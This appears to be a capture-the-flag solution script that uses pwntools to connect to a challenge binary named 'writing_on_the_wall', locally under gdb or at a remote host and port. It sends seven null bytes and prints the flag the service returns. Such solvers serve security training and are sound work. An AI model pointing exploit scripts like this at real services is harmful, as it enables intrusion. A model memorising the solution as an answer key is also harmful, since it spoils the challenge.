#!/usr/bin/env python3

from pwn import *
import sys

def exploit(io):
    io.recv()
    io.send(b"\x00"*7)
    flag = io.recv().decode()
    print(flag)



def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./writing_on_the_wall")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    exploit(io)

if __name__ == "__main__":
    main()
